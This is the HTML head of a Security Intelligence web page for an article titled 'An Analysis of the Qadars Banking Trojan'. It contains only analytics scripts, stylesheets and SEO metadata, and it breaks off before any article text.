<!doctype html>
<html lang="en-US">

<head>
      <meta charset="UTF-8">
      <link rel="shortcut icon" type="image/x-icon" href="https://securityintelligence.com/wp-content/themes/sapphire/images/favicon.ico" sizes="32x32" />      <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1">

      <!-- DEFINITIONS -->
      <title>An Analysis of the Qadars Banking Trojan</title>

            <!--<meta name="description" content="">-->


     

      <!-- THEME COLOR -->
      <meta name="theme-color" content="#000000">

      <!-- REFERRER POLICY -->
      <meta name="referrer" content="no-referrer-when-downgrade">

      <!-- LANGUAGE/TRANSLATIONS -->

      <!-- AMP SCRIPTS -->
      <script async src="https://cdn.ampproject.org/v0.js"></script>
      <script async custom-element="amp-list" src="https://cdn.ampproject.org/v0/amp-list-0.1.js"></script>
      <script async custom-template="amp-mustache" src="https://cdn.ampproject.org/v0/amp-mustache-0.2.js"></script>
      <script async custom-element="amp-accordion" src="https://cdn.ampproject.org/v0/amp-accordion-0.1.js"></script>
      <script custom-element="amp-animation" src="https://cdn.ampproject.org/v0/amp-animation-0.1.js" async></script>
      <script custom-element="amp-position-observer" src="https://cdn.ampproject.org/v0/amp-position-observer-0.1.js" async></script>
      <script async custom-element="amp-bind" src="https://cdn.ampproject.org/v0/amp-bind-0.1.js"></script>
      <script async custom-element="amp-autocomplete" src="https://cdn.ampproject.org/v0/amp-autocomplete-0.1.js"></script>
      <script async custom-element="amp-social-share" src="https://cdn.ampproject.org/v0/amp-social-share-0.1.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/version/v1.35.0/card-section-simple.min.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/tag/v1/latest/card-section-simple.min.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/tag/v1/next/card-section-simple.min.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/version/v2.11.0/card.min.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/version/v2.11.0/image.min.js"></script>

      

      
      
      
                  <script async custom-element="amp-lightbox-gallery" src="https://cdn.ampproject.org/v0/amp-lightbox-gallery-0.1.js"></script>
            <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
            <script async custom-element="amp-video" src="https://cdn.ampproject.org/v0/amp-video-0.1.js"></script>
            <script async custom-element="amp-youtube" src="https://cdn.ampproject.org/v0/amp-youtube-0.1.js"></script>
                              <link rel="preload" as="image" href="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/12/working-on-christmas-eve-holidayslaptop-on-table-with-christmas-tree-with-light-decorating-bokeh-at-condominuam-apartment-working-hard-on-weekend-holidays-ideas-concept-300x158.jpeg.webp" media="(max-width: 300px)">
                  <link rel="preload" as="image" href="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/12/working-on-christmas-eve-holidayslaptop-on-table-with-christmas-tree-with-light-decorating-bokeh-at-condominuam-apartment-working-hard-on-weekend-holidays-ideas-concept-630x330.jpeg.webp" media="(max-width: 1200px) and (min-width: 301px)">
                  <link rel="preload" as="image" href="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/12/working-on-christmas-eve-holidayslaptop-on-table-with-christmas-tree-with-light-decorating-bokeh-at-condominuam-apartment-working-hard-on-weekend-holidays-ideas-concept-1200x630.jpeg.webp" media="(max-width: 2400px) and (min-width: 631px)">
                  <link rel="preload" as="image" href="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/12/working-on-christmas-eve-holidayslaptop-on-table-with-christmas-tree-with-light-decorating-bokeh-at-condominuam-apartment-working-hard-on-weekend-holidays-ideas-concept-2400x1260.jpeg.webp" media="(max-width: 2400px) and (min-width: 1201px)">
                  
      
      <!-- ANALYTICS -->
      <script>
      
      window._ibmAnalytics = {
            "settings": {
                  "name": "SecurityIntelligence",
                  "tealiumProfileName": "ibm-subsidiary"
            },
            "digitalData.page.services.google.enabled": true
      };
      window.digitalData = {
            "page": {
                  "pageInfo": {
                        "effectiveDate": "2015-07-23",
                        "publishDate": "2015-07-23",
                        "ibm": {
                              "siteId": "IBM_" + _ibmAnalytics.settings.name,
                        }
                  },
                  "category": {
                        "primaryCategory": "PC090"
                  }
            }
      };

      
      // Custom Click Tagging
      // Collect and send clicks not detectable by ida_stats.js
      function sendClickTag(section, feature, destination) {
            console.log(section + " " + feature)
            var config = {
                  type: 'ELEMENT',
                  primaryCategory: section, // e_a1 - Element Category
                  eventName: feature, // e_a2 - Element Name
                  targetURL: destination, // e_a7 - Element Attribute: ibmEvTarget
            };
            ibmStats.event(config);
      }

      // Custom Click Tagging
      // Collect and send clicks not detectable by ida_stats.js
      // function sendClickConversion(feature, title) {
      //   var config = {
      //         type               : 'pageclick',
      //         primaryCategory    : 'PAGE CLICK',
      //         eventCategoryGroup : "TIMELINE - SECURITY INTELLIGENCE",
      //         eventName          : feature,
      //         targetTitle        : title
      //       };
      //   ibmStats.event(config);
      // }

      // Custom Link Event
      // Add clicktag event on every link inside the element
      function tagAllLinks(element, section, feature) {
            var element = document.querySelectorAll(element);
            if (typeof(element) != 'undefined' && element != null) {
                  for (var i = 0; i < element.length; i++) {
                        var elements = element[i].querySelectorAll("a:not(.btn)");
                        for (var o = 0; o < elements.length; o++) {
                              if (elements[o].getAttribute('listener') !== 'true') {
                                    var destination = elements[o].getAttribute('href');
                                    elements[o].addEventListener('click', function() {
                                          if (this.getAttribute('listener') === 'true') {
                                                sendClickTag(section, feature, this.getAttribute('href'));
                                                this.setAttribute('listener', 'false');
                                          }
                                    }, false);
                                    elements[o].setAttribute('listener', 'true');
                              }
                        }
                  }
            }
      }

      window.onload = function() {

            // Call to action click tag
            var ctaButton = document.querySelectorAll(".single__content a");
            if (typeof(ctaButton) != 'undefined' && ctaButton != null && ctaButton.length !== 0) {
                  for (var i = 0; i < ctaButton.length; i++) {
                        ctaButton[i].addEventListener('click', function() {
                              if (this.getAttribute('listener') === 'true') {
                                    sendClickTag("BODY", "CALL TO ACTION");
                                    this.setAttribute('listener', 'false');
                              }
                        }, false);
                        ctaButton[i].setAttribute('listener', 'true');
                  }
            }

            // Read more click tag
            var readButton = document.querySelectorAll(".continue-reading button");
            if (typeof(readButton) != 'undefined' && readButton != null && readButton.length !== 0) {
                  for (var i = 0; i < readButton.length; i++) {
                        readButton[i].addEventListener('click', function() {
                              if (this.getAttribute('listener') === 'true') {
                                    sendClickTag("BODY", "READ-MORE");
                                    this.setAttribute('listener', 'false');
                              }
                        }, false);
                        readButton[i].setAttribute('listener', 'true');
                  }
            }


            //  LISTICLES tag - Arrows
            //left arrow
            var leftArrow = document.getElementById("prev");
            if (typeof(leftArrow) != 'undefined' && leftArrow != null) {
                  //for (var i = 0; i < leftArrow.length; i++) {
                  leftArrow.addEventListener('click', function() {
                        if (this.getAttribute('listener') === 'true' && leftArrow.id == "prev") {
                              sendClickTag("BODY", "LISTICLE-LEFT-ARROW");
                              this.setAttribute('listener', 'false');
                        }
                  }, false);
                  leftArrow.setAttribute('listener', 'true');
                  //}
            }
            //right arrow
            var rightArrow = document.getElementById("next");
            if (typeof(rightArrow) != 'undefined' && rightArrow != null) {
                  //for (var i = 0; i < rightArrow.length; i++) {
                  rightArrow.addEventListener('click', function() {
                        if (this.getAttribute('listener') === 'true' && rightArrow.id == "next") {
                              sendClickTag("BODY", "LISTICLE-RIGHT-ARROW");
                              this.setAttribute('listener', 'false');
                        }
                  }, false);
                  rightArrow.setAttribute('listener', 'true');
                  //}
            }



            //  LISTICLES tag - numbers
            var listicleTopButton = document.querySelectorAll(".listicle__pagination__numbers");
            if (typeof(listicleTopButton) != 'undefined' && listicleTopButton != null && listicleTopButton.length !== 0) {
                  for (var i = 0; i < listicleTopButton.length; i++) {
                        var currentSlide = 1;

                        listicleTopButton[i].addEventListener('click', function() {

                              if (this.getAttribute('listener') === 'true') {
                                    currentSlide++;
                                    var total = i;

                                    // var clickedSlides=currentSlide/2;
                                    // console.log(clickedSlides.toFixed());

                                    //I'm removing 2 because 2 arrows on the listicle are unclickable, but present on the DOM
                                    // clickableArrows = i-2;
                                    // clickableArrows = i-1;
                                    // I'm deviding by 2 because on each slide we have 2 arrows, so we were actually sendind the double of tags
                                    // clickableArrows= clickableArrows/2;
                                    // console.log(i);
                                    // clickableArrows.toFixed();

                                    if (currentSlide <= total) {
                                          sendClickTag("PAGE CLICK", "LISTICLE-NAVIGATION-SLIDE" + currentSlide);
                                          this.setAttribute('listener', 'false');
                                    } else {
                                          sendClickTag("PAGE CLICK", "LISTICLE-NAVIGATION-END");
                                          this.setAttribute('listener', 'false');
                                    }


                              }
                        }, false);
                        listicleTopButton[i].setAttribute('listener', 'true');
                  }
            }
            // // Timeline box click tag
            // var boxButton = document.querySelectorAll(".timeline__content .box");
            // if (typeof(boxButton) != 'undefined' && boxButton != null && boxButton.length !== 0) {
            //   for (var i = 0; i < boxButton.length; i++) {
            //     boxButton[i].addEventListener('click', function(){
            //       if (this.getAttribute('listener') === 'true') {
            //         sendClickConversion("DETAILED VIEW", this.getAttribute('data-title'));
            //         this.setAttribute('listener', 'false');
            //       }
            //     }, false);
            //     boxButton[i].setAttribute('listener', 'true');
            //   }
            // }

      };
</script>

      <script src="https://1.www.s81c.com/common/stats/ibm-common.js" type="text/javascript" async="async"></script>

      <!-- AMP DEFAULT CSS -->
      <style amp-boilerplate>
            body {
                  -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
                  -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
                  -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
                  animation: -amp-start 8s steps(1, end) 0s 1 normal both
            }

            @-webkit-keyframes -amp-start {
                  from {
                        visibility: hidden
                  }

                  to {
                        visibility: visible
                  }
            }

            @-moz-keyframes -amp-start {
                  from {
                        visibility: hidden
                  }

                  to {
                        visibility: visible
                  }
            }

            @-ms-keyframes -amp-start {
                  from {
                        visibility: hidden
                  }

                  to {
                        visibility: visible
                  }
            }

            @-o-keyframes -amp-start {
                  from {
                        visibility: hidden
                  }

                  to {
                        visibility: visible
                  }
            }

            @keyframes -amp-start {
                  from {
                        visibility: hidden
                  }

                  to {
                        visibility: visible
                  }
            }
      </style><noscript>
            <style amp-boilerplate>
                  body {
                        -webkit-animation: none;
                        -moz-animation: none;
                        -ms-animation: none;
                        animation: none
                  }
            </style>
      </noscript>

      <link rel="stylesheet" href="https://securityintelligence.com/wp-content/themes/sapphire/minifications/modules.css?v=1715191630">

      <!-- CUSTOM CSS -->
      <meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel="alternate" type="application/rss+xml" title="Security Intelligence &raquo; An Analysis of the Qadars Banking Trojan Comments Feed" href="https://securityintelligence.com/an-analysis-of-the-qadars-trojan/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/securityintelligence.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://securityintelligence.com/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='taxonomy-image-plugin-public-css' href='https://securityintelligence.com/wp-content/plugins/taxonomy-images/css/style.css?ver=0.9.6' type='text/css' media='screen' />
<script type="text/javascript" src="https://securityintelligence.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://securityintelligence.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://securityintelligence.com/wp-content/themes/sapphire/app/javascript/si-theme-cookie.js?ver=6.7.1" id="si-cookie-consent-js"></script>
<link rel="https://api.w.org/" href="https://securityintelligence.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://securityintelligence.com/wp-json/wp/v2/posts/362455" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://securityintelligence.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel='shortlink' href='https://securityintelligence.com/?p=362455' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://securityintelligence.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurityintelligence.com%2Fan-analysis-of-the-qadars-trojan%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://securityintelligence.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurityintelligence.com%2Fan-analysis-of-the-qadars-trojan%2F&#038;format=xml" />
<link rel="icon" href="https://securityintelligence.com/wp-content/uploads/2016/04/SI_primary_rgb-80x80.png" sizes="32x32" />
<link rel="icon" href="https://securityintelligence.com/wp-content/uploads/2016/04/SI_primary_rgb.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://securityintelligence.com/wp-content/uploads/2016/04/SI_primary_rgb.png" />
<meta name="msapplication-TileImage" content="https://securityintelligence.com/wp-content/uploads/2016/04/SI_primary_rgb.png" />
<style amp-custom>@import url('https://1.www.s81c.com/common/carbon-for-ibm-dotcom/tag/v1/latest/plex.css');</style><link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css"><link rel="stylesheet" href="https://securityintelligence.com/wp-content/themes/sapphire/minifications/single.css?v=1722279696">
      <!-- YOAST SEO -->
      
<!-- This site is optimized with the Yoast SEO Premium plugin v13.1 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="This blog provides a deep, technical look into the Qadars banking Trojan."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://securityintelligence.com/an-analysis-of-the-qadars-trojan/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="An Analysis of the Qadars Banking Trojan" />
<meta property="og:description" content="This blog provides a deep, technical look into the Qadars banking Trojan." />
<meta property="og:url" content="https://securityintelligence.com/an-analysis-of-the-qadars-trojan/" />
<meta property="og:site_name" content="Security Intelligence" />
<meta property="article:tag" content="Advanced Threats" />
<meta property="article:tag" content="Banking Trojan" />
<meta property="article:tag" content="Qadars Trojan" />
<meta property="article:tag" content="Threat Intelligence" />
<meta property="article:tag" content="X-Force" />
<meta property="article:section" content="X-Force" />
<meta property="article:published_time" content="2015-07-23T08:10:20+00:00" />
<meta property="article:modified_time" content="2020-03-20T21:21:36+00:00" />
<meta property="og:updated_time" content="2020-03-20T21:21:36+00:00" />
<meta property="fb:app_id" content="3703311399714818" />
<meta property="og:image" content="https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png" />
<meta property="og:image:secure_url" content="https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png" />
<meta property="og:image:width" content="922" />
<meta property="og:image:height" content="656" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="This blog provides a deep, technical look into the Qadars banking Trojan." />
<meta name="twitter:title" content="An Analysis of the Qadars Banking Trojan" />
<meta name="twitter:image" content="https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png" />
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://securityintelligence.com/#website","url":"https://securityintelligence.com/","name":"Security Intelligence","inLanguage":"en-US","description":"Analysis and Insight for Information Security Professionals","potentialAction":{"@type":"SearchAction","target":"https://securityintelligence.com/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"ImageObject","@id":"https://securityintelligence.com/an-analysis-of-the-qadars-trojan/#primaryimage","inLanguage":"en-US","url":"https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png","width":922,"height":656},{"@type":"WebPage","@id":"https://securityintelligence.com/an-analysis-of-the-qadars-trojan/#webpage","url":"https://securityintelligence.com/an-analysis-of-the-qadars-trojan/","name":"An Analysis of the Qadars Banking Trojan","isPartOf":{"@id":"https://securityintelligence.com/#website"},"inLanguage":"en-US","primaryImageOfPage":{"@id":"https://securityintelligence.com/an-analysis-of-the-qadars-trojan/#primaryimage"},"datePublished":"2015-07-23T08:10:20+00:00","dateModified":"2020-03-20T21:21:36+00:00","author":{"@id":"https://securityintelligence.com/#/schema/person/20c4e8422f4fb83685517709866c68f6"},"description":"This blog provides a deep, technical look into the Qadars banking Trojan."},{"@type":["Person"],"@id":"https://securityintelligence.com/#/schema/person/20c4e8422f4fb83685517709866c68f6","name":"Igor Aronov","image":{"@type":"ImageObject","@id":"https://securityintelligence.com/#authorlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/d85bd719765158318ecc3917d98763d3?s=96&d=mm&r=g","caption":"Igor Aronov"},"description":"Igor Aronov is a 